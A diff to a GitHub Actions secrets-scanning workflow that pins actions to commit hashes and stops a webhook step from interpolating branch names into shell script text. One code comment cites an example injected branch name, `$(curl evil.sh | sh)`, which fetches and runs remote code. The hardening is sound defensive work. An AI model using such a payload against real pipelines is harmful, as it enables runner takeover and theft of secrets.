@@ -20,7 +20,7 @@ jobs:
     name: Scan for secrets
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v4
+      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0
         with:
           fetch-depth: 0
 
@@ -42,20 +42,28 @@ jobs:
       - name: Upload SARIF report
         if: always()
         continue-on-error: true   # a reporting failure must not mask the scan result
-        uses: github/codeql-action/upload-sarif@v3
+        uses: github/codeql-action/upload-sarif@f3712979fa5f215279b101dd0a2e3bdfb4353324 # v3.37.7
         with:
           sarif_file: gitleaks-report.sarif
 
       - name: Send JSON to endpoint
         if: always()
+        # Branch name and repo name reach the shell as env vars, never as
+        # ${{ }} interpolation. A branch called `$(curl evil.sh | sh)` would
+        # otherwise be substituted into the script text before bash parses it.
+        env:
+          WEBHOOK_URL: ${{ secrets.SAST_GITLEAK_WEBHOOK_URL }}
+          WEBHOOK_TOKEN: ${{ secrets.SAST_WEBHOOK_TOKEN }}
+          BRANCH: ${{ github.head_ref || github.ref_name }}
+          REPO_NAME: ${{ github.event.repository.name }}
         run: |
           if [ ! -f gitleaks-report.json ]; then
             echo "::warning::no gitleaks-report.json to send — the scan produced no report."
             exit 0
           fi
-          curl -X POST "${{ secrets.SAST_GITLEAK_WEBHOOK_URL }}?branch=${{ github.head_ref || github.ref_name }}&&repo=${{ github.event.repository.name }}" \
+          curl -X POST "${WEBHOOK_URL}?branch=${BRANCH}&repo=${REPO_NAME}" \
             -H "Content-Type: application/json" \
-            -H "Authorization: Bearer ${{ secrets.SAST_WEBHOOK_TOKEN }}" \
+            -H "Authorization: Bearer ${WEBHOOK_TOKEN}" \
             -d @gitleaks-report.json
 
       - name: Fail if secrets were found
